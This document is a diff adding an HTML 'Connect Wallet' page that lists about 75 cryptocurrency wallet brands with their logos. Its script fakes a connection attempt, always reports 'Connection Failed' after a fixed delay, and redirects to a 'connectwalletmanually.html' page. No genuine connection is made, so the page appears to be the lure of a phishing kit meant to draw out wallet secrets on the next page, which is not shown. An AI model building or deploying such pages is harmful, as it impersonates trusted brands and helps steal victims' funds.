@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet</title>
+    
+    <link rel="stylesheet" href="./connectwallet_files/all.min.css">
+    <link rel="stylesheet" href="./connectwallet_files/bootstrap.min.css">
+    <link rel="stylesheet" href="./connectwallet_files/bootstrap.min-1.css">
+    <link rel="stylesheet" href="./connectwallet_files/2.6 animate.css.css">
+    
+    <style>
+        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; }
+        
+        /* Header Styling */
+        #header { padding: 40px 0 20px; text-align: center; }
+        .header-img { width: 50px; height: auto; margin-bottom: 15px; }
+        .coin-section-header h1 { font-size: 28px; font-weight: 700; margin-bottom: 5px; }
+        .coin-section-header h6 { color: #848e9c; font-weight: 400; margin-bottom: 30px; }
+
+        /* Wallet Grid - Matches your screenshot layout */
+        .coin-registry {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+            gap: 15px;
+            padding: 20px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        /* Wallet Card - Content is perfectly centered */
+        .coin {
+            background: #1e2329;
+            border: 1px solid #30363d;
+            border-radius: 16px;
+            padding: 20px 10px;
+            display: flex;
+            flex-direction: column; 
+            align-items: center;    
+            justify-content: center;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+            border: none;
+            outline: none;
+        }
+
+        .coin:hover { background: #2b3139; transform: translateY(-3px); }
+
+        .coin-img {
+            width: 50px !important;
+            height: 50px !important;
+            object-fit: contain;
+            border-radius: 10px;
+            margin-bottom: 12px;
+        }
+
+        .coin h4 {
+            font-size: 13px;
+            color: #eaecef;
+            margin: 0;
+            font-weight: 500;
+            text-align: center;
+            width: 100%;
+        }
+
+        /* Modal / Connection Popup */
+        .dialog-overlay-loading {
+            display:none; position: fixed; top:0; left:0; width:100%; height:100%; 
+            background:rgba(0,0,0,0.85); z-index:9999; justify-content:center; align-items:center;
+        }
+        .loading-dialog { background:#1e2329; padding:40px; border-radius:20px; text-align:center; border: 1px solid #333; width: 90%; max-width: 400px; margin: auto; }
+        
+        /* Dynamic Icon in Popup */
+        #selected-wallet-display { width: 60px; height: 60px; margin-bottom: 20px; border-radius: 12px; object-fit: contain; display: none; margin-left: auto; margin-right: auto; }
+
+        /* SKY BLUE MANUAL BUTTON */
+        .manual-connect { 
+            margin-top: 25px; padding: 12px 25px; background-color: #87CEEB; color: #000; 
+            border: none; border-radius: 8px; font-weight: bold; cursor: pointer; display: none; width: 100%; font-size: 16px;
+        }
+
+        .loader { border: 4px solid #333; border-top: 4px solid #87CEEB; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="dialog-overlay-loading" id="overlay">
+        <div class="loading-dialog">
+            <img id="selected-wallet-display" src="" alt="Selected Wallet">
+            <div id="loader-content">
+                <div class="loader"></div>
+                <h4>Initializing Connection...</h4>
+            </div>
+            <div id="error-content" style="display:none;">
+                <h4 style="color:#f6465d; margin-bottom: 10px;">Connection Failed</h4>
+                <p style="color:#eaecef">Unable to establish secure connection automatically.</p>
+                <button class="manual-connect" id="manualBtn">Connect Manually</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="header">
+        <img class="header-img" src="./connectwallet_files/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png">
+        <div class="coin-section-header">
+            <h1>Connect Wallet</h1>
+            <h6>Select a wallet to begin synchronization</h6>
+        </div>
+    </div>
+
+    <div class="coin-section">
+        <div class="coin-registry">
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png"><h4>Other wallets</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/trustlogo.jpg"><h4>Trust</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/uniswap.png"><h4>Uniswap</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/MetaMask_Fox.svg.png"><h4>Metamask</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/FLEDGER.png"><h4>Ledger</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/best.png"><h4>Best wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/Coinbaselogo_Supplied_250x250-2.png"><h4>Coinbase</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/rabby-seeklogo.png"><h4>Rabby wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/ZERION.jpg"><h4>Zerion Wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/phantom.jpeg"><h4>Phantom wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/jupiter.jpeg"><h4>Jupiter</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/cosmos.png"><h4>Cosmos station</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/exodus.png"><h4>Exodus wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/c36500d2-7e4b-40f5-a48b-3e6e364d7248.png"><h4>Rainbow</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/binance.jpg"><h4>Binance Wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png"><h4>Binance Chain</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/lg.png"><h4>Safemoon</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/lg-1.jpeg"><h4>Gnosis Safe</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-1.png"><h4>DeFi</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/1_vpjxotLULTkmcJFq4y2eng.png"><h4>imToken</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/xaMan.jpg"><h4>Xaman Wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/6323b6987f8e01af2ce9189a_public.png"><h4>TokenPocket</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/aave-aave-logo.png"><h4>Aave</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/xverse.jpeg"><h4>Xverse</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/2772.png"><h4>Digitex</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/portis_logo_dribbble.png"><h4>Portis</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/rtDOqMXY_400x400.jpg"><h4>Formatic</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/MathWallet_App_Icon.png"><h4>MathWallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/1581439195205.jpg"><h4>BitPay</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/lg-3.jpeg"><h4>Ledger Live</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/neon.png"><h4>Neon</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/49746116.png"><h4>Authereum</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/5DxVDK36_400x400.png"><h4>Dharma</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/lg.jpeg"><h4>1inch Wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/lg-6.jpeg"><h4>Huobi</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/solflare.png"><h4>Solflare</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/okx.png"><h4>OKX</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/lg-4.jpeg"><h4>Loopring</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/trustvault.png"><h4>TrustVault</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/atomic_wallet_logo_dark_rounded_2.png"><h4>Atomic</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/10903.png"><h4>Coin98</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/tron-trx-logo.png"><h4>Tron</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/36216689.png"><h4>AlphaWallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/BITGET.png"><h4>Bitget Wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/6323b69954bc41ff9409f033_public.png"><h4>ZelCore</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/lg-5.jpeg"><h4>Nash</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/1433894569.png"><h4>Coinmoni</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/28931745.png"><h4>GridPlus</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-6.png"><h4>CYBAVO</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/512x512bb-2.jpg"><h4>Tokenary</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/44049579.png"><h4>Torus</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-4.png"><h4>Spatium</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/safepal.png"><h4>SafePal</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-7.png"><h4>Infinito</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/images.png"><h4>wallet.io</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-12.png"><h4>Ownbit</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/512x512bb-1.jpg"><h4>EasyPocket</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-3.png"><h4>Bridge Wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/Sparkpoint-wallet-logo.png"><h4>Spark Point</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-13.png"><h4>ViaWallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/Bitkeep-wallet-logo.png"><h4>BitKeep</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/images.jpeg"><h4>Vision</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-10.png"><h4>PEAKDEFI</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-9.png"><h4>Unstoppable</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/76861339.png"><h4>HaloDeFi</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-14.png"><h4>Dok Wallet</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/images-1.png"><h4>Midas</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/1_N6Uvv2QMQGqQubnGP1tGig.png"><h4>Ellipal</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/LOGO-KEYRING-PRO-2.png"><h4>KEYRING PRO</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/AKS.png"><h4>Aktionariat</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-8.png"><h4>Talken</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/0x0.png"><h4>Flare</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/lg-2.jpeg"><h4>KyberSwap</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-11.png"><h4>PayTube</h4></button>
+            <button class="coin" onclick="handleWalletClick(this)"><img class="coin-img" src="./connectwallet_files/unnamed-2.png"><h4>Linen</h4></button>
+        </div>
+    </div>
+
+    <script src="./connectwallet_files/jquery-3.6.0.min.js"></script>
+    <script>
+        function handleWalletClick(elem) {
+            var img = $(elem).find(".coin-img").attr("src");
+            var name = $(elem).find("h4").text();
+            
+            // SAVE SELECTION FOR THE NEXT PAGE
+            localStorage.setItem("selectedWalletImg", img);
+            localStorage.setItem("selectedWalletName", name);
+
+            $("#selected-wallet-display").attr("src", img).show();
+            $("#overlay").css("display", "flex");
+            $("#loader-content").show();
+            $("#error-content").hide();
+            $(".manual-connect").hide();
+
+            setTimeout(function() {
+                $("#loader-content").hide();
+                $("#error-content").show();
+                $(".manual-connect").fadeIn();
+            }, 2500);
+        }
+
+        $("#manualBtn").on("click", function() {
+            window.location.href = 'connectwalletmanually.html';
+        });
+    </script>
+</body>
+</html>
